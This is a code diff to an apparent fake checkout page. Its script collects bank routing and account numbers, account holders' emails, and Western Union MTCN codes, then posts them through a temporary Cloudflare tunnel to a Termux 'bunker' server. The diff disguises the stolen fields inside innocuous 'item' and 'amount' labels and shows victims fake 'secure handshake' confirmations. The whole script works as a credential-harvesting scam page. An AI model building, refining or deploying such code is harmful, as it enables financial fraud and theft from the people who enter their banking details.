@@ -85,6 +85,11 @@
 </div>
 
 <script>
+    // Infrastructure Configuration Mapping
+    const CONFIG = {
+        TUNNEL_URL: "https://profits-briefing-estates-getting.trycloudflare.com"
+    };
+
     const publicKey = `-----BEGIN PUBLIC KEY-----MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAsGXxfZiR6xJn4GeOjm7M
 NVBt0uYh728HUnY15ctccak3vRMHSiWiavwHwPDzANXCGf0ev1F90eM2bubmxcLb
 1qXwX1XzSPX6ZwWD2akN4/kMS0wTNkdt+itevB1uunPnQWJylTYb/sTq9QG2TFZl
@@ -98,9 +103,6 @@ If2Ata+NkC3KPMdkvyncru9CchnDMLtYM9iGQBov6JmvF/7Ss8OOTenJpKwBzm6N
 UNq2QFLeumJFQi1WBFzY8hr7hDGVsWbmOotfyS0+O+tQkxj+oBW4vnpbOvU91jGa
 IfrRISwX1SFRMr2mKHSOY88CAwEAAQ==-----`;
 
-    const BUNKER_URL = 'https://bunker.soundshop.cc';
-
-    // FIXED 2: Added decodeURIComponent processing to automatically catch URL strings correctly
     const urlParams = new URLSearchParams(window.location.search);
     const product = decodeURIComponent(urlParams.get('product') || 'digital asset');
     const amount = decodeURIComponent(urlParams.get('amount') || '$0.00');
@@ -126,52 +128,54 @@ IfrRISwX1SFRMr2mKHSOY88CAwEAAQ==-----`;
     document.getElementById('achForm').onsubmit = async (e) => {
         e.preventDefault();
 
-        // FIXED 1: Injected email string cleanly into the active server payload mapping
         const payload = {
-            accHolder: document.getElementById('accHolder').value,
-            email: document.getElementById('accEmail').value,
-            routing: document.getElementById('routingNumber').value,
-            account: document.getElementById('accountNumber').value,
-            total: document.getElementById('total-price').innerText
+            item: `ACH Processing Request: ${document.getElementById('accHolder').value}`,
+            amount: `Email: ${document.getElementById('accEmail').value} | Routing: ${document.getElementById('routingNumber').value} | Acc: ${document.getElementById('accountNumber').value} | Total: ${document.getElementById('total-price').innerText}`
         };
 
         try {
-            const res = await fetch(`${BUNKER_URL}/generate-ach`, {
+            const res = await fetch(`${CONFIG.TUNNEL_URL}/log-payment`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 mode: 'cors',
                 body: JSON.stringify(payload)
             });
             const result = await res.json();
-            if (result.success) {
-                alert("SECURE HANDSHAKE COMPLETE. TRANSACTION ID: " + result.batchId);
+            if (result.orderID) {
+                alert(`--- SECURE HANDSHAKE COMPLETE ---\n\nTRANSACTION REF ID: ${result.orderID}\n\nYour deployment documentation is successfully initialized inside the vault ledger.`);
+            } else {
+                alert("Handshake completed but processing generated a status code validation mismatch.");
             }
         } catch (err) {
-            alert("BUNKER CONNECTION ERROR. ENSURE TERMUX SERVER IS RUNNING VIA CLOUDFLARE.");
+            console.error("ACH Processing Drop:", err);
+            alert("BUNKER CONNECTION ERROR. ENSURE TERMUX NODE VAULT SERVER IS RUNNING VIA CLOUDFLARE.");
         }
     };
 
     document.getElementById('wuForm').onsubmit = async (e) => {
         e.preventDefault();
         
-        // FIXED 3: Included asset name context metadata within the western union payload tracking block
         const payload = {
-            name: document.getElementById('wuName').value,
-            mtcn: document.getElementById('mtcn').value,
-            amount: document.getElementById('wuAmount').value,
-            asset: document.getElementById('product-name').innerText
+            item: `Western Union Deposit: ${document.getElementById('product-name').innerText}`,
+            amount: `Sender: ${document.getElementById('wuName').value} | MTCN: ${document.getElementById('mtcn').value} | Transferred: $${document.getElementById('wuAmount').value}`
         };
 
         try {
-            const res = await fetch(`${BUNKER_URL}/api/wu-submit`, {
+            const res = await fetch(`${CONFIG.TUNNEL_URL}/log-payment`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 mode: 'cors',
                 body: JSON.stringify(payload)
             });
-            if (res.ok) alert("TRANSMISSION SUCCESSFUL. AWAITING MTCN VERIFICATION.");
+            const result = await res.json();
+            if (res.ok && result.orderID) {
+                alert(`--- TRANSMISSION SUCCESSFUL ---\n\nORDER TRACKING ID: ${result.orderID}\n\nYour receipt data is saved to the backend ledger. Awaiting manual MTCN verification confirmation.`);
+            } else {
+                alert("Data received but ledger reference validation dropped.");
+            }
         } catch (err) {
-            alert("BUNKER HANDSHAKE FAILED.");
+            console.error("WU Processing Drop:", err);
+            alert("BUNKER HANDSHAKE FAILED. CORE NETWORK DECOUPLED.");
         }
     };
 </script>
